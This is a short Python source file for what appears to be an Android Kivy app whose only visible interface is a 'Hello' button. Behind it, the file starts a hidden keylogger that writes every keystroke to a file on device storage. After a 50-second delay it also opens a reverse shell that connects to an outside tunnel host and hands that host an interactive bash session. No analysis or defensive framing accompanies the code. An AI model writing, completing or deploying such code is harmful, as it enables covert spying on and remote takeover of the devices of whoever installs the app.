import socket
import subprocess
import os
import pty
import time
from pynput.keyboard import Listener
from kivy.app import App
from kivy.uix.button import Button
from threading import Thread

# Function to log keystrokes
def write_to_log(key):
    letter = str(key).replace("'", "")

    if key == "Key.space":
        letter = " "
    elif key == "Key.enter":
        letter = "\n"
    elif key == "Key.backspace":
        letter = " [BACKSPACE] "

    with open("/storage/emulated/0/log.txt", "a") as f:
        f.write(letter)

# Function to start keylogger in a separate thread
def start_keylogger():
    with Listener(on_press=write_to_log) as listener:
        listener.join()

# Function to establish a reverse shell connection
def reverse_shell():
    try:
        time.sleep(50)  # Delay before executing the shell
        print("[*] Establishing reverse shell connection...")

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("agent-bhutan.gl.at.ply.gg", 31699))

        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)

        pty.spawn("/bin/bash")  # Start an interactive shell

    except Exception as e:
        print(f"[!] Error: {e}")

# Kivy GUI class
class MyApp(App):
    def build(self):
        return Button(text="Hello")

# Start keylogger in a separate thread
keylogger_thread = Thread(target=start_keylogger, daemon=True)
keylogger_thread.start()

# Start reverse shell in a separate thread
reverse_shell_thread = Thread(target=reverse_shell, daemon=True)
reverse_shell_thread.start()

# Start the Kivy GUI
MyApp().run()

